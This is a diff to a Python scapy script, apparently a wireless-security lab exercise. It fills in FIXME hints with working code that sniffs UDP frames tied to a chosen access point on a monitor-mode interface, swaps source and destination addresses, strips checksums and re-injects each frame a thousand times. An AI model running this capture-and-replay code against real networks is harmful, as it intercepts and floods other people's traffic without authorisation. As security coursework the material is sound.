@@ -1,7 +1,5 @@
-from scapy.all import *
+from scapy.all import RadioTap, Dot11FCS, LLC, Dot11QoS, Dot11Beacon, Dot11WEP, sniff, Dot11, ls, UDP, IP, send, sendp, sr, srp, FlagsField
 import sys
-from rc4 import generate_seed, rc4
-from scapy.utils import hexstr
 
 if len(sys.argv) < 3:
     print('Usage: python3 sniff_decypher.py [AP_NAME] [Sniff count]')
@@ -36,14 +34,19 @@ Capture a frame
 client_data = []
 def sniff_client(pkt):
     global AP_INFO
-    #FIXME:
-    #  find dataframes: hint take a look at WireShark
+    if UDP in pkt:
+        if (pkt.addr1 == AP_INFO['mac'] or pkt.addr2 == AP_INFO['mac'] or pkt.addr3 == AP_INFO['mac'] or pkt.addr4 == AP_INFO['mac']):
+            print(pkt.addr1, pkt.addr2, pkt.addr3, pkt.addr4)
+            client_data.append(pkt)
 
 sniff(count=int(sys.argv[2]), iface='wlan0mon', prn=sniff_client)
 
 for cd in client_data:
-    #FIXME:
-    # LVL0: Send the message back to the sender
-    # LVL1: Modify the payload and send the message back to the sender
+    cd[IP].src, cd[IP].dst = cd[IP].dst, cd[IP].src
+    cd[Dot11FCS].addr1, cd[Dot11FCS].addr3 = cd[Dot11FCS].addr3, cd[Dot11FCS].addr1
+
+    del cd[Dot11FCS].fcs
+    del cd[IP].chksum
+    del cd[UDP].chksum
 
     sendp(cd, iface='wlan0mon', count=1000)
